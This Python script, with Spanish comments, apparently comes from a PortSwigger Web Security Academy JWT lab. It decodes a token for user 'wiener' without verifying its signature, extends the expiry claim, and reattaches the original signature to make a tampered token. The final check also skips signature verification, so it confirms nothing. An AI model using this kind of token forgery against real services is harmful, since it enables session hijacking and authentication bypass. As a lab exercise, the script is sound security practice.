import base64
import jwt
import json
import time

# Token original
token = 'eyJraWQiOiJhYmY3YTcwMi1iOGNlLTQ5ODUtYTY3ZS1hN2UyYjM4YTk4YjkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjYwNDYwNSwic3ViIjoid2llbmVyIn0.hcVsnVNuBrNRARzqrArP4AW2oRRalJktMAmqiwcCcKa5lD74sOMqxgZoW03pcbzHxwLjsH-l-LfS-qDORY8DAM9l8wcUii8QYJNDcsoltifUzU_xyRzookd9tGozmW7FzNCt1yT46jbFX-u2E-KGVrzN8Hfa6daTHZVbeh0Il-OqR0eKcbPxeUM7smQpBorxbprUzCGruuCFWSeUuTRrbSgE3cbAdjSV8t6J9alsb8CSBDWeBOgniR8fDuiz-irYk4yDsgwo8984pFHJpwFjA43ZpL5iymRIm_urnja6wqTe6xILvwL5riP5f_qScOrlkFUvumnD62a9wBh36U-zjQ'
exp_time = 86400 #24 horas = 86400 segundos

# Decodificar el token (sin verificar firma)
payload = jwt.decode(token, options={"verify_signature": False})
print(f"Token original decodificado: {payload}\n")

# Extraer las partes del token
header, payload_str, signature = token.split('.')

# Decodificar el payload
decoded_payload = base64.urlsafe_b64decode(payload_str + '=' * (-len(payload_str) % 4))
payload_dict = json.loads(decoded_payload.decode())

# Ampliar el tiempo de expiración
new_exp_time = int(time.time()) + exp_time
payload_dict['exp'] = new_exp_time

print(f"Payload modificado: {payload_dict}\n")

# Convertir el payload modificado a JSON y luego a base64
modified_payload_json = json.dumps(payload_dict).encode()
modified_payload_b64 = base64.urlsafe_b64encode(modified_payload_json).rstrip(b'=').decode()

# Generar el nuevo token modificado
modified_token = f"{header}.{modified_payload_b64}.{signature}"
print(f"Token modificado: {modified_token}\n")

# Verificar que el token modificado sea válido
try:
    decoded_modified = jwt.decode(modified_token, options={"verify_signature": False})
    print(f"Token modificado decodificado: {decoded_modified}")
except jwt.InvalidTokenError as e:
    print(f"Error al decodificar token modificado: {e}")